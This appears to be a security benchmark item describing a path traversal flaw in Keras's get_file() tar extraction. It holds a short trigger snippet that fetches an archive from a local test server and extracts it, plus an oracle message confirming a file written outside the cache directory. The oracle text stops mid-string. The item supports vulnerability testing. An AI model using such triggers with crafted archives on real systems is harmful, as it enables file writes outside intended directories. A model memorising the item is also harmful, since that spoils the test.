title: Directory traversal in keras.utils.get_file() due to missing tarfile extractall filter parameter
cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
trigger_payload:
import keras
get_file = keras.utils.get_file
extracted_path = get_file("keras_dataset", "http://127.0.0.1:8005/keras_dataset.tgz", cache_dir="/test/keras_cache", extract=True)
oracle:
File created at /test/exploit/keras_pwned.txt with content 'KERAS VULNERABILITY CONFIRMED!
This file was created outside the cache directory!
Keras get_file() is vulnerable to PATH_MAX symlink attacks!
